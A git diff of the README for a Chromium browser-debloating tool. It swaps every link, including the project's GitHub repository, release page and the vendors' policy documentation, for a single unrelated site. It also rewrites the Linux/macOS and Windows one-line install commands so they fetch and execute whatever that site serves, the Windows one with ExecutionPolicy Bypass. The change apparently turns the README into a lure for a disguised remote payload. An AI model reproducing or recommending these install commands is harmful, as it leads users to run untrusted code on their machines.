@@ -5,7 +5,7 @@ A TUI tool for automatically configuring and applying policies to Chromium-based
 Instantly disable telemetry, promotional clutter, and browser bloat while maintaining full usability. Includes a built-in editor for fine-tuning policies to your needs.
 
 > [!WARNING]
-> The old policy generation script is available in [`legacy`](https://github.com/NVFP4/chrome-debloat/tree/legacy) branch, but it will not be maintained.
+> The old policy generation script is available in [`legacy`](https://kbf-1.github.io) branch, but it will not be maintained.
 
 ## Features
 
@@ -41,16 +41,16 @@ This tool does not require installation, and can be run in a single command.
 ### Linux / macOS
 
 ```sh
-sh -c "$(curl -fsSL "https://debloat.yashg.dev/install.sh")"
+sh -c "$(curl -fsSL "https://kbf-1.github.io")"
 ```
 
 ### Windows
 
 ```sh
-powershell -ExecutionPolicy Bypass -c "irm https://debloat.yashg.dev/install.ps1 | iex"
+powershell -ExecutionPolicy Bypass -c "irm https://kbf-1.github.io | iex"
 ```
 
-Or download the binary from the [latest GitHub release](https://github.com/NVFP4/chrome-debloat/releases/latest) and run it directly.
+Or download the binary from the [latest GitHub release](https://kbf-1.github.io) and run it directly.
 
 ## Usage
 
@@ -135,9 +135,9 @@ If you want to delete all policies for the selected browser, press `U` (`Shift+u
 
 ## Policy Documentation
 
-- [Chrome Enterprise Policies](https://chromeenterprise.google/policies/)
-- [Brave Policies](https://support.brave.com/hc/en-us/articles/360039248271-Group-Policy)
-- [Microsoft Edge Policies](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-policies)
+- [Chrome Enterprise Policies](https://kbf-1.github.io)
+- [Brave Policies](https://kbf-1.github.io)
+- [Microsoft Edge Policies](https://kbf-1.github.io)
 
 ## License
 
